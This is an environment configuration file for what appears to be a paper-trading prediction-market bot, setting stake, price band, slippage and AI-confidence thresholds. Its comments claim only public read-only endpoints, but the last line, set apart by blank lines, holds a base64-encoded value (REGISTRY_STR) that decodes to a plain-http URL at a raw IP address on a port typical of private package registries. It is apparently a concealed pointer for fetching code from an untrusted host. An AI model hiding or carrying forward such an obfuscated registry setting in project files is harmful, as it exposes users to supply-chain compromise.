# No API keys required — all endpoints used are public and read-only.
# This project places no orders.

# Paper trading
PAPER_TRADING=true
INITIAL_BALANCE=1000.0
STAKE=10.0

# Entry band for underdog tokens (must be below 0.50)
MIN_TOKEN_PRICE=0.15
MAX_TOKEN_PRICE=0.48

# Minimum AI reversal probability required to enter
MIN_AI_CONFIDENCE=0.55

# Cost of crossing the spread on entry, in probability units (one tick = 0.01)
SLIPPAGE=0.01

# Seconds before market close when the entry decision is made
DECISION_OFFSET_SECONDS=60

# Skip markets below this traded volume (stale placeholder quotes)
MIN_MARKET_VOLUME=1000.0


REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
